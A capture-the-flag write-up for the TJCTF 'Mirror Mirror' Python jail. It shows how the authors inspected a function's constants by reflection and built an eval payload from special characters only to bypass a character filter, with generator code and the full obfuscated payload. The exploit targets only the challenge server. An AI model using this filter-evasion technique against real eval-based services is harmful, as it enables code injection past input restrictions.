# Mirror Mirror (Miscellaneous, 89 solved, 100 points)
###### Author: [qrzcn](https://github.com/qrzcn), [capfly](https://github.com/Capfly), [ecurve](https://github.com/Pascalao)

```
If you look closely, you can see a reflection.

nc problem1.tjctf.org 8004
```

Firstly we take a look onto the server and found out that there is a method get_flag(), 
which are to used, because of the greeting message.

```
Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!
```

Now we playing a little bit around with that function and we get an error, when we type

```python
>>> get_flag("")
Traceback (most recent call last):
  File "<console>", line 1, in <module>
  File "/home/app/problem.py", line 23, in get_flag
    if(eval(input) == super_secret_string):
  File "<string>", line 0
    
    ^
SyntaxError: unexpected EOF while parsing
```

Ok, thats cool! 
We can put something into the eval function, which evaluate our string. 
Now it is time to find out, what are allowed in the console. 
The most functions and modules are deleted in the moment or restricted. 
But we take a look into the description and there is a hint. Use reflection!

Firstly we tried *dir()* and get:

```python
>>> dir()
['__builtins__', '__doc__', '__name__', 'get_flag']
```

Can we take a deeper look into the function with reflection? 
We tried it and yes, we can look into the variables of the *get_flag* function.

```python
>>> get_flag.func_code.co_consts
(None, 'this_is_the_super_secret_string', 48, 57, 65, 90, 97, 122, 44, 95, ' is not a valid character', '%\xcb', "You didn't guess the value of my super_secret_string")
>>> get_flag.func_code.co_varnames
('input', 'super_secret_string', 'each', 'val')
```

Ok, the content of the *super_secret_string* should be the string *this_is_the_super_secret_string*.
But what is with the numbers behind the secret string?
The numbers are ascii characters and we found out, that all characters from a to z and A to Z are restricted.
Also restricted characters are 0 to 9 and the special characters _ and ,.
The conclusion is, that only special character can be used, to type into the function get_flag, expect _ and ,.

But wait, how it is possible to exploit that, if we can not type a string into it?

When you know how the python interpreter works internally it is possible to find a way to do that.
We remembered on a challenge in the past from a clever guy, which used only special characters to
type strings into the console or eval function. That is really cool! ([writeup](http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/))

We used the same strategy to generate strings only with special characters. 
As we know from him, we can generate every string with %c%(\<number\>) and we can also compute every number
with a lot of special characters, it is possible to write the string *this_is_the_super_secret_string* 
as input into the eval function. 

We used his brainfuckize function to generate these numbers.

```python
def brainfuckize(nb):
        if nb in [-2, -1, 0, 1]:
            return ["~({}<[])", "~([]<[])","([]<[])",  "({}<[])"][nb+2]
        if nb % 2:
            return "~%s" % brainfuckize(~nb)
        else:
            return "(%s<<({}<[]))" % brainfuckize(nb/2)
```

Now we have to generate the whole string only with special characters. 
This code does it for us:

```python
    string = 'this_is_the_super_secret_string'
    result = ""
    formatter = "`'%\\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%"
    concat = '+'

    for c in string:
        result += formatter + brainfuckize(ord(c)) + concat

    print result[:-1]
```

In general we only used the possibility that we can type *'%c'%(\<number\>)* into the console only with special characters 
and get a character.
And the translation from a number to the special characters are done with the brainfuckize function.
The code with the %\xcb and the special characters behind produce the '%c'%:

```python
`'%\\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%
```

The trick to compute numbers from special characters are that 
```python
{}<[] == True
``` 
and 
```python
[]<[] == False
```

And we know that True is internally a 1 and False a 0.
The special characters ```<``` and ```~``` can be used to perfom bit operations.
With that knowledge it is possible to compute every number only with the characters. 

```python
<< ~ ( )
```

It is the same logic as you learned in mathematical logic that you can build all logic compositions within a NOT and AND.

The program produce the string *'this_is_the_super_secret_string'* only with special characters:

```python
`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%
\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xc
b'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb
'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[
{}<[]::~(~({}<[])<<({}<[]))]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]
::~(~({}<[])<<({}<[]))]%~(~((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]:
:~(~({}<[])<<({}<[]))]%~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(
~({}<[])<<({}<[]))]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<
[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])
<<({}<[]))]%(((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<(
{}<[]))]%~(~(~(~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({
}<[]))]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[])
)]%~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%
~(~(~(~(~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(
(((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~(~(
~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((~
((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((((~(({
}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~((~((~({}<[
])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~(~(~((~(~({}<[]
)<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~(((~(~({}<[])<<
({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((~((~({}<[])<<({}
<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~(~(~((~(~({}<[])<<({}<
[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[])
)<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((((~(({}<[])<<({}<[]))<<({
}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~((~((~({}<[])<<({}<[]))<<({}<[
]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[]))<<({}<[]))
<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((~((~({}<[])<<({}<[]))<<({}<[]))<<(
{}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({
}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(((~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[
]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))
<<({}<[]))<<({}<[]))<<({}<[]))
```

When you put that string into a python console you will get the string *'this_is_the_super_secret_string'*.

The final step is to put the string into the get_flag function:

```python
>>> get_flag("`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))
<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<(
{}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({
}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[
]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`
'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'
%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\x
cb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[
{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<
[]::~(~({}<[])<<({}<[]))]%(((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]:
:~(~({}<[])<<({}<[]))]%~(~(~(~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::
~(~({}<[])<<({}<[]))]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}
<[])<<({}<[]))]%~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])
<<({}<[]))]%~(~(~(~(~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<
<({}<[]))]%((((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<
[]))]%~(~(~(~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[
]))]%(~(~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))
]%~(((((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((
~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~(~(
~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~(((
~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((~((~
({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~(~(~((~(~(
{}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<
[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((((~(({}<[])<<
({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~((~((~((~({}<[])<<({}
<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(~(~((~({}<[])<<({}<[]
))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((~((~({}<[])<<({}<[]))<
<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(~((~(~(~(~({}<[])<<({}<[]))<<
({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(((~(~(~({}<[])<<({}<[]))<<({}
<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))+`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%~(((~((~(~({}<[])<<({}<[]))<<({}<[]
))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))")
tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}
```

We get the flag!

Thw whole python script are in the file [exploit.py](https://github.com/Lev9L-Team/ctf/tree/master/2018-08-07_tjctf/mirror_mirror/exploit.py).